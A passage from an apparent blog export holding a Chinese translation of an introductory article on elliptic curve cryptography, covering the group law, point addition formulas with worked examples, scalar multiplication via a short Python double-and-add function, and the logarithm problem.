但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p id=\\\"double-and-add\\\">\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 未完待续\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[10,49],[10,50],[1,\"p\",[]]]}","html":"<!--kg-card-begin: html--><script type=\"text/javascript\" async\n  src=\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\">\n</script>\n\n<script type=\"text/x-mathjax-config\">\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\n</script><!--kg-card-end: html--><!--kg-card-begin: markdown--><blockquote>\n<p>本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 <a href=\"https://creativecommons.org/licenses/by/4.0/deed.zh\">CC-BY 4.0 协议</a> 进行授权<br>\n原文链接 : <a href=\"https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\">https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/</a><br>\n原作者: <a href=\"https://andrea.corbellini.name/\">ANDREA CORBELLINI</a><br>\n译者: <a href=\"http://blog.chxj.name/\">chxj1992</a></p>\n</blockquote>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 <strong>ECC</strong>, <strong>ECD</strong>或者<strong>ECDSA</strong>. ECC是椭圆曲线密码学(<code>Elliptic Curve Cryptography</code>)的首字母缩写, 而另外两个都是基于ECC实现的算法.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>如今, 我们在 <a href=\"https://tools.ietf.org/html/rfc4492\">TLS</a>, <a href=\"https://tools.ietf.org/html/rfc6637\">PGP</a> 和 <a href=\"https://tools.ietf.org/html/rfc5656\">SSH</a> 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在<a href=\"https://en.bitcoin.it/wiki/Secp256k1\">比特币</a>和其他各种加密货币中发挥的巨大作用了.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和<a href=\"http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/\">可以轻松实现的简化模型</a>, 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的<strong>目标</strong>并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 <strong>什么是ECC以及它为什么是安全的</strong>, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>具体来说, 本系列文章将涉及以下内容:</p>\n<ol>\n<li><a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/\">实数域上的椭圆曲线和群论</a> (本篇文章将会讨论)</li>\n<li><a href=\"http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh\">有限域上的椭圆曲线和离散对数难题</a></li>\n<li><a href=\"http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh\">秘钥对的生成及两种ECC算法: ECDH和ECDSA</a></li>\n<li><a href=\"http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh\">ECC破解算法和与RSA的对比</a></li>\n</ol>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是&quot;简单&quot;问题, 什么是&quot;复杂&quot;问题以及他们在密码学中锁扮演的角色有一个清晰的认识.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><a id=\"elliptic-curves\"> </a><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">椭圆曲线</h1>\n<p>首先, 什么是椭圆曲线? <a href=\"http://mathworld.wolfram.com/\">Wolfram MathWorld</a> 给出了一个超赞且完善的<a href=\"http://mathworld.wolfram.com/EllipticCurve.html\">定义</a>. 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合:</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: html-->$$y^2 = x^3 + ax + b$$<!--kg-card-end: html--><!--kg-card-begin: html-->且满足 $4a^3 + 27b^2 \\ne 0$ (以便排除<a href=\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).<!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/curves.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><pre style=\"font-size: 0.75em;color: #66645c;\">\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\n</pre><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/singularities.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html-->奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.<!--kg-card-end: html--><!--kg-card-begin: markdown--><p>根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: html-->$$\\left\\{ (x, y) \\in \\mathbb{R}^2\\ |\\ y^2 = x^3 + ax + b,\\ 4 a^3 + 27 b^2 \\ne 0 \\right\\}\\ \\cup\\ \\left\\{ 0 \\right\\}$$<!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">群</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n数学上的群是指定义了一个用\"+\"表示的二元运算\"加法\"的集合. 为了让集合 $\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \n</p>\n\n<ol>\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\mathbb{G}$ 中的元素 </li>\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\n</ol>\n\n如果我们再加上第五个条件: \n<br>\n<strong>交换律:</strong> $a + b = b + a$\n<br>\n那么这个群就可以被称作<strong>阿贝尔群</strong>\n\n<p>\n    根据加法的一般概念, 整数集合 $\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\n</p>\n\n<p>\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><a id=\"group-law\"></a><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">椭圆曲线上的群律</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n    我们可以在椭圆曲线上定义一个群, 具体来说:\n</p>\n\n<ul>\n  <li>\n    群里的元素是椭圆曲线上的点\n  </li>\n  <li>\n    <strong>单位元</strong>是指在无穷远处的点 0\n  </li>\n  <li>\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\n  </li>\n  <li>\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\n  </li>\n</ul><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/three-aligned-points.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><pre style=\"font-size: 0.75em;color: #66645c;\">\n在一条直线上的三点之和为0\n</pre><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\n</p>\n\n<p>\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><a id=\"geometric-addition\"></a><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">几何意义上的加法运算</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/point-addition.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><pre style=\"font-size: 0.75em;color: #66645c;\">\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\n</pre><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \n    \n  <ul>\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\n  </ul>\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/animation-point-doubling.gif\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><pre style=\"font-size: 0.75em;color: #66645c;\">\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\n</pre><!--kg-card-end: html--><!--kg-card-begin: html-->当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.<!--kg-card-end: html--><!--kg-card-begin: html--><p>\n  <ul>\n    <li> <strong> 如果 $P \\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\n  </ul>\n<p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/animation-tangent-line.gif\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><pre style=\"font-size: 0.75em;color: #66645c;\">\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \n很容易就能看出两点之和为切点关于x轴的对称点.\n</pre><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\n</p>\n\n<p>\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\">HTML5/JavaScript版可视化工具</a> !</strong>\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><a id=\"algebraic-addition\"></a><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">代数意义上的加法运算</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\n</p>\n\n<pre style=\"font-size: 0.75em;color: #66645c;\">\n译者注: \n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\"> Promgramming BitCoin 的第二章 </a> </strong> \n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \n</pre>\n\n<p>\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\n</p>\n\n<p>\n    如果 P 和 Q 不相等 ($x_P \\ne x_Q$), 则过两点的直线的斜率为:\n    $$ m = \\frac{y_P - y_Q}{x_P - x_Q} $$ \n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\n    $$ \n    \\begin{array}{rcl}\n    x_R & = & m^2 - x_P - x_Q \\\\\n    y_R & = & y_P + m(x_R - x_P)\n\t\\end{array} \n    $$\n    或者写成: \n    $$ y_R = y_Q + m(x_R - x_Q) $$\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\n</p>\n\n<p>\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\n</p>\n\n<p>\n    作为替代方案, 我们可以用一个<a href=\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \n    $$\n    \\begin{array}{rcl}\n    m & = & \\frac{y_P - y_Q}{x_P - x_Q} = \\frac{2 - 4}{1 - 3} = 1 \\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\cdot (-3 - 1) = -2 \\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\cdot (-3 - 3) = -2\n\\end{array}\n    $$\n    很好, 结果是正确的!\n</p>\n\n<p>\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\n    $$\n    \\begin{array}{rcl}\n    m & = & \\frac{y_P - y_Q}{x_P - x_Q} = \\frac{4 - 2}{-1 - 1} = -1 \\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\cdot (1 - (-1)) = 2\n\\end{array}\n    $$\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\">可视化工具</a>算出的结果是一样的\n</p>\n    \n<p>\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\n    $$ m = \\frac{3 x_P^2 + a}{2 y_P} $$\n    正如我们所料, m 的表达式是如下方程的一阶导数: \n    $$ y_P = \\pm \\sqrt{x_P^3 + ax_P + b} $$\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\n    $$\n    \\begin{array}{rcl}\n    m & = & \\frac{3x_P^2 + a}{2 y_P} = \\frac{3 \\cdot 1^2 - 7}{2 \\cdot 2} = -1 \\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\cdot (-1 - 1) = 4\n\\end{array}\n    $$\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\">结果是正确的!</a>\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><a id=\"scalar-multiplication\"> </a><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">标量乘法</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \n    $$ \n    nP = \\underbrace{P + P + \\cdots + P}_{n\\ \\text{times}}\n    $$\n  \t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\">可视化工具</a>, 有兴趣的话可以看看.\n</p>\n\n<p>\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\n</p>\n\n<p id=\"double-and-add\">\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\n    $$\n    \\begin{array}{rcl}\n    151 & = & 1 \\cdot 2^7 + 0 \\cdot 2^6 + 0 \\cdot 2^5 + 1 \\cdot 2^4 + 0 \\cdot 2^3 + 1 \\cdot 2^2 + 1 \\cdot 2^1 + 1 \\cdot 2^0 \\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 